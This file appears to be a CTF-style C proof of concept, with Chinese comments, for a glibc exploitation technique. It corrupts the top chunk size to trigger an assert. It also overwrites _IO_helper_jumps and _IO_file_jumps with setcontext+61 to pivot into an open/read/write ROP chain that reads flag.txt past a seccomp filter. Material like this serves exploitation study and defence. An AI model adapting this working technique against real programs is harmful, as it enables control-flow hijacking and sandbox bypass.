// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2
//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#define pop_rdi_ret libc_base + 0x000000000002858F
#define pop_rdx_r12 libc_base + 0x0000000000114161
#define pop_rsi_ret libc_base + 0x000000000002AC3F
#define pop_rax_ret libc_base + 0x0000000000045580
#define syscall_ret libc_base + 0x00000000000611EA
#define ret pop_rdi_ret+1
size_t libc_base;
size_t ROP[0x30];
char FLAG[0x100] = "./flag.txt\x00";
void sandbox()
{
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    struct sock_filter sfi[] ={
        {0x20,0x00,0x00,0x00000004},
        {0x15,0x00,0x05,0xC000003E},
        {0x20,0x00,0x00,0x00000000},
        {0x35,0x00,0x01,0x40000000},
        {0x15,0x00,0x02,0xFFFFFFFF},
        {0x15,0x01,0x00,0x0000003B},
        {0x06,0x00,0x00,0x7FFF0000},
        {0x06,0x00,0x00,0x00000000}
    };
    struct sock_fprog sfp = {8, sfi};
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &sfp);
}

void setROP()
{
    uint32_t i = 0;
    ROP[i++] = pop_rax_ret;
    ROP[i++] = 2;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = (size_t)FLAG;
    ROP[i++] = pop_rsi_ret;
    ROP[i++] = 0;
    ROP[i++] = syscall_ret;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = 3;
    ROP[i++] = pop_rdx_r12;
    ROP[i++] = 0x100;
    ROP[i++] = 0;
    ROP[i++] = pop_rsi_ret;
    ROP[i++] = (size_t)(FLAG + 0x10);
    ROP[i++] = (size_t)read;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = 1;
    ROP[i++] = (size_t)write;
}
int main() {
    setvbuf(stdin,0LL,2,0LL);
    setvbuf(stdout,0LL,2,0LL);
    setvbuf(stderr,0LL,2,0LL);
    sandbox();
    libc_base  = ((size_t)setvbuf) - 0x81630;
    printf("LIBC:\t%#lx\n",libc_base);

    size_t magic_gadget = libc_base + 0x53030 + 61; // setcontext + 61
    size_t IO_helper = libc_base + 0x1E48C0; // _IO_helper_jumps;
    size_t SYNC = libc_base + 0x1E5520; // sync pointer in _IO_file_jumps
    setROP();
    *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp
    *((size_t*)IO_helper + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址
    *((size_t*)SYNC) = magic_gadget; // 设置fflush(stderr)中调用的指令地址
    // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert
    size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);
    *top_size = (*top_size)&0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在
    malloc(0x1000); // 触发assert
    _exit(-1);
}
